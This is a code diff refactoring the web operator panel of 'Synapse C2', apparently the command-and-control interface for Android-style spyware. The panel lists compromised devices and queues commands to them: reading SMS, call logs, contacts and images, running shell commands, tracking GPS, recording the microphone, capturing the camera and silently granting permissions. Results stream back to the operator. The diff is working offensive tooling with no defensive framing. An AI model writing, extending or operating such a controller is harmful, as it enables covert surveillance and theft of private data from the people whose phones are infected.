@@ -2,7 +2,6 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Synapse C2</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
@@ -11,44 +10,41 @@ body{font-family:monospace;background:#0a0e14;color:#c8d6e5;display:flex;height:
 #main{flex:1;padding:15px;display:flex;flex-direction:column;gap:10px}
 h2{font-size:14px;color:#5a6e82;margin-bottom:8px}
 .device{border:1px solid #1e2a3a;padding:10px;margin-bottom:6px;border-radius:4px;cursor:pointer}
-.device:hover{border-color:#4da6ff}
-.device.sel{border-color:#4da6ff;background:#141f2e}
+.device:hover,.device.sel{border-color:#4da6ff}
+.device.sel{background:#141f2e}
 .dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px}
 .on{background:#3cc95b;box-shadow:0 0 6px #3cc95b}
 .off{background:#f85149}
-.id{font-size:12px;color:#4da6ff;word-break:break-all}
+.id{font-size:12px;color:#4da6ff}
 .info{font-size:11px;color:#5a6e82;margin-top:3px}
 .btn{background:#1a3a1a;border:1px solid #2ea043;color:#fff;padding:6px 14px;border-radius:4px;cursor:pointer;font-size:12px;font-family:monospace;margin:2px}
 .btn:hover{background:#2ea043}
 .btn:disabled{opacity:0.3;cursor:not-allowed}
 #output{flex:1;background:#0d1117;border:1px solid #1e2a3a;border-radius:4px;padding:10px;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-word}
 #toolbar{display:flex;flex-wrap:wrap;gap:4px}
-.sep{width:1px;background:#1e2a3a;margin:0 5px}
-.stat{font-size:11px;color:#5a6e82;margin-bottom:6px}
 </style>
 </head>
 <body>
 <div id="sidebar">
-  <h2>↯ DEVICES <span id="devcount">(0)</span></h2>
-  <div id="devlist">Connecting...</div>
+  <h2>DEVICES <span id="devcount">(0)</span></h2>
+  <div id="devlist">Loading...</div>
 </div>
 <div id="main">
   <div id="toolbar">
-    <button class="btn" onclick="cmd('ping','ping')">Ping</button>
-    <button class="btn" onclick="cmd('info','gather')">Info</button>
-    <button class="btn" onclick="cmd('sms','list','{\"count\":\"10\"}')">SMS</button>
-    <button class="btn" onclick="cmd('calls','list','{\"count\":\"20\"}')">Calls</button>
-    <button class="btn" onclick="cmd('contacts','list')">Contacts</button>
-    <button class="btn" onclick="cmd('files','list','{\"type\":\"images\",\"count\":\"20\"}')">Files</button>
-    <button class="btn" onclick="cmd('shell','exec','{\"cmd\":\"id\"}')">Shell</button>
-    <button class="btn" onclick="cmd('location','get')">GPS</button>
-    <button class="btn" onclick="cmd('mic','record','{\"duration\":\"10\"}')">Mic</button>
-    <button class="btn" onclick="cmd('camera','capture')">Camera</button>
-    <button class="btn" onclick="cmd('silent_grant','grant')">SilentGrant</button>
+    <button class="btn" data-cmd="ping,ping">Ping</button>
+    <button class="btn" data-cmd="info,gather">Info</button>
+    <button class="btn" data-cmd="sms,list" data-params='{"count":"10"}'>SMS</button>
+    <button class="btn" data-cmd="calls,list" data-params='{"count":"20"}'>Calls</button>
+    <button class="btn" data-cmd="contacts,list">Contacts</button>
+    <button class="btn" data-cmd="files,list" data-params='{"type":"images","count":"20"}'>Files</button>
+    <button class="btn" data-cmd="shell,exec" data-params='{"cmd":"id"}'>Shell</button>
+    <button class="btn" data-cmd="location,get">GPS</button>
+    <button class="btn" data-cmd="mic,record" data-params='{"duration":"10"}'>Mic</button>
+    <button class="btn" data-cmd="camera,capture">Camera</button>
+    <button class="btn" data-cmd="silent_grant,grant">Grant</button>
   </div>
-  <div id="output">Waiting for commands...</div>
+  <div id="output">Waiting...</div>
 </div>
-
 <script>
 var activeId = '';
 var deviceData = {};
@@ -59,12 +55,8 @@ async function fetchDevs(){
     var d = await r.json();
     deviceData = {};
     (d.devices||[]).forEach(function(x){deviceData[x.id]=x;});
-    renderSidebar();
     if(!activeId || !deviceData[activeId] || !deviceData[activeId].online){
-      // auto-select first online
-      for(var k in deviceData){
-        if(deviceData[k].online){ activeId = k; break; }
-      }
+      for(var k in deviceData){if(deviceData[k].online){activeId=k;break;}}
     }
     renderSidebar();
   }catch(e){}
@@ -82,39 +74,45 @@ function renderSidebar(){
     html += '</div>';
   }
   document.getElementById('devlist').innerHTML = html || 'No devices';
-  // disable buttons if no device selected
   var btns = document.querySelectorAll('.btn');
   for(var i=0;i<btns.length;i++) btns[i].disabled = !activeId;
 }
 
 function select(id){ activeId = id; renderSidebar(); }
 
-async function cmd(mod, act, params){
-  if(!activeId){ alert('No device selected'); return; }
-  var p = {};
-  if(params) try{p = JSON.parse(params);}catch(e){alert('Bad params');return;}
+async function sendCmd(mod, act, params){
+  if(!activeId) return alert('No device selected');
   document.getElementById('output').textContent = 'Sending '+mod+'/'+act+'...';
   try{
     var r = await fetch('/api/command',{
       method:'POST',
       headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({device_id:activeId, module:mod, action:act, params:p})
+      body: JSON.stringify({device_id:activeId, module:mod, action:act, params:params||{}})
     });
     var d = await r.json();
-    document.getElementById('output').textContent = 'Queued: '+mod+'/'+act+' ['+(d.command_id||'?')+']\n\nWaiting for result...';
+    document.getElementById('output').textContent = 'Sent: '+mod+'/'+act+' ['+(d.command_id||'?')+']';
   }catch(e){
     document.getElementById('output').textContent = 'Error: '+e.message;
   }
 }
 
-// SSE for results
+// Wire buttons
+document.querySelectorAll('.btn[data-cmd]').forEach(function(btn){
+  btn.addEventListener('click', function(){
+    var parts = this.dataset.cmd.split(',');
+    var params = null;
+    if(this.dataset.params) try{params=JSON.parse(this.dataset.params);}catch(e){}
+    sendCmd(parts[0], parts[1], params);
+  });
+});
+
+// SSE
 function sse(){
   var es = new EventSource('/api/events');
   es.onmessage = function(e){
     try{
       var r = JSON.parse(e.data);
-      if(!r.data) return;
-      document.getElementById('output').textContent = r.data;
+      if(r.data) document.getElementById('output').textContent = r.data;
     }catch(ex){}
   };
   es.onerror = function(){ setTimeout(sse,2000); };
